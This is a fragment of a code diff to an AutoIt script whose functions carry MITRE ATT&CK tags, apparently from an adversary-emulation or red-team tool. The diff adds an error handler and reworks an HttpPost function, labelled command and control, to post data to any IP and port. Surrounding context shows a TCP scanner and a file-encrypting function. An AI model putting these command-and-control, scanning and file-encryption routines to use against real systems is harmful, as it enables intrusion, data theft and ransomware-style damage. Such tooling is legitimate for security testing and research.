@@ -10,6 +10,14 @@
 #include <AutoItConstants.au3>
 #include <Crypt.au3>
 
+$ErrorHandler = ObjEvent("AutoIt.Error", "ErrFunc") ; Custom error handler
+
+;Error handler
+Func ErrFunc()
+    $HexNumber = Hex($ErrorHandler.number, 8)
+    Return SetError(1, $HexNumber)
+ EndFunc
+
 Func init();DESCRIPTION:init;MITRE:-
    If $CmdLine[0] > 0 Then
 	  $action = $CmdLine[1]
@@ -246,19 +254,15 @@ Func TCPscanner($ip,$port);DESCRIPTION:TCP scanner;MITRE:Discovery
    EndIf
 EndFunc
 
-Func HttpPost($ip, $tag, $sData = "");DESCRIPTION:Send data over Http;MITRE:Command and Control
-   if TCPscanner($ip, "80") == "open" Then
+Func HttpPost($ip, $tag, $port = "80", $sData = "");DESCRIPTION:Send data over Http;MITRE:Command and Control
 	  Local $oHTTP = ObjCreate("WinHttp.WinHttpRequest.5.1")
-	  $oHTTP.Open("POST", "http://" & $ip, False)
-	  If (@error) Then Return 0
+	   $oHTTP.Open("POST", "http://" & $ip & ":" & $port, False)
 	  $oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
 	  $oHTTP.Send($tag & "=" & $sData)
-	  If (@error) Then Return 0
-	  If ($oHTTP.Status <> 200) Then Return SetError(3, 0, 0)
-	  Return SetError(0, 0, $oHTTP.ResponseText)
-   Else
-	  Return 0
-   EndIf
+	  If @error Then
+			Return "error"
+		 Exit
+	  EndIf
 EndFunc
 
 Func EncryptFiles($password,$folder);DESCRIPTION:Encrypt the files in a directory;MITRE:Post-Adversary Device Access
